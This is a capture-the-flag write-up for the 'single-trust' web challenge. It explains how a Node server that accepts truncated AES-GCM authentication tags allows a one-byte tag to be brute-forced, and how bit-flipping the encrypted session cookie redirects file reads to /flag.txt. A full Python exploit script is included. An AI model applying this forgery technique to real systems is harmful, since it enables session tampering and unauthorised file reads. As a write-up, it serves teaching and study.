# single-trust

**Category:** web

---

#### Description

The app stores a JSON session object in a client cookie `auth`, encrypted with AES-256-GCM:

* plaintext: `{"tmpfile":"/tmp/pastestore/<32 hex chars>"}`
* cookie: `base64(iv).base64(authTag).base64(ciphertext)`

On each request it decrypts the cookie and uses `user.tmpfile` as the file to read/write. The flag is in `/flag.txt`.

#### Solution

Node (Ubuntu 20.04 `nodejs` package, v10.19.0) accepts *truncated* GCM tags via `decipher.setAuthTag()`. Since the server does not enforce a 16-byte tag length, we can send a 1-byte tag, reducing authentication strength to 8 bits. We can then brute-force the tag byte for any modified ciphertext (\~256 requests).

We cannot directly change the 32 unknown hex bytes (we don't know their plaintext, so we can't compute XOR deltas there). But we can avoid needing them:

1. Keep bytes 28..59 (the unknown hex) unchanged.
2. Rewrite only the first 28 bytes of plaintext from:
   * `{"tmpfile":"/tmp/pastestore/` to:
   * `{"tmpfile":"/flag.txt","x":"`
3. Leave the last 2 bytes unchanged (`"}`), so the unknown 32 bytes become the value of `"x"`, and `tmpfile` becomes `/flag.txt`.

Because AES-GCM encryption is XOR with a keystream, we can transform known plaintext bytes by XORing the ciphertext with `P0 ^ P1` for those positions. After modifying the ciphertext, we brute-force a 1-byte tag until the server accepts it and returns `/flag.txt` in the page.

Exploit code (prints the flag):

```py
import base64
import re
import urllib.parse
import requests

BASE = "https://single-trust.chall.lac.tf"

# Known plaintext prefix in the original cookie (28 bytes)
P0 = b'{"tmpfile":"/tmp/pastestore/'
# Desired prefix (also 28 bytes): set tmpfile to /flag.txt and start a filler field "x"
P1 = b'{"tmpfile":"/flag.txt","x":"'
assert len(P0) == len(P1) == 28

s = requests.Session()
r = s.get(BASE + "/", timeout=15)
r.raise_for_status()

# Cookie value is URL-encoded in Set-Cookie; decode then split on '.'
auth = urllib.parse.unquote(s.cookies.get("auth"))
iv_b64, tag_b64, ct_b64 = auth.split(".")
iv = base64.b64decode(iv_b64)
ct = base64.b64decode(ct_b64)

# Bit-flip first 28 bytes of ciphertext to change plaintext P0 -> P1
ctm = bytearray(ct)
for i in range(28):
    ctm[i] ^= P0[i] ^ P1[i]
ctm = bytes(ctm)

# Brute-force 1-byte GCM tag
for guess in range(256):
    tag1 = bytes([guess])
    forged = ".".join(
        [
            base64.b64encode(iv).decode(),
            base64.b64encode(tag1).decode(),
            base64.b64encode(ctm).decode(),
        ]
    )
    r = requests.get(BASE + "/", cookies={"auth": forged}, timeout=15)
    m = re.search(r"lactf\\{[^}]+\\}", r.text)
    if m:
        print(m.group(0))
        break
```
